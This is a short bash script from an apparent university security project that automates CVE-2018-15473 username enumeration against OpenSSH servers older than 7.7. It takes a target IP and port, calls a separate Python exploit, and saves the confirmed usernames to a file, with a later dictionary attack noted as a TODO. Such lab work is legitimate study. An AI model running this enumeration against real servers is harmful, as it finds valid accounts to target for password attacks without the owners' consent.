#!/bin/bash

# automatized script for run user enumerate
# base on https://github.com/Rhynorater/CVE-2018-15473-Exploit by Justin Gardner
# use for user enumeration on OpenSSH version < 7.7
# discovered in  CVE-2018-15473 url: https://nvd.nist.gov/vuln/detail/CVE-2018-15473
# plus used own dictionary attack on discovered users - TODO
# creators : Jakub Jedlicka 
# school project for BUT FEEC 
# subject IBEP
# project assigment https://github.com/jedla97/ICT1/blob/master/BPC-IC1-Zadani_Projektu-2020.pdf


##### start of script #####

# default port of ssh
defPort=22

# default ip adress
defIpAdress=10.0.2.6

# read user input of ip adres of server
echo "Input Ip adress of server"

read ipAdress

# if input is empty use default ip adress
if [ -z "$ipAdress" ];
then
	ipAdress=$defIpAdress
fi

# read user input of port when blank default port is define
echo "Input port if blank default is 22"

read port

# if port is empty default port is use
if [ -z "$port" ];
then
	port=$defPort
fi

# if port is not a number script is ended and warning is outputed on stderr
if ! [[ $port =~ ^[0-9]+$ ]]; 
then
	echo 'wrong input run script again' >/dev/stderr
	exit 99
fi

echo $port
# runnig script from Justin Gardner
python ./enum/ssh_user_enum.py --port $port --userList fewnames.txt --outputFile allusers.txt $ipAdress

# every valid user will be copy to validUsers.txt without "is a valid user"
grep 'is a valid user' allusers.txt |cut -d' ' -f1 >validUsers.txt

# show few first valid users
head validUsers.txt
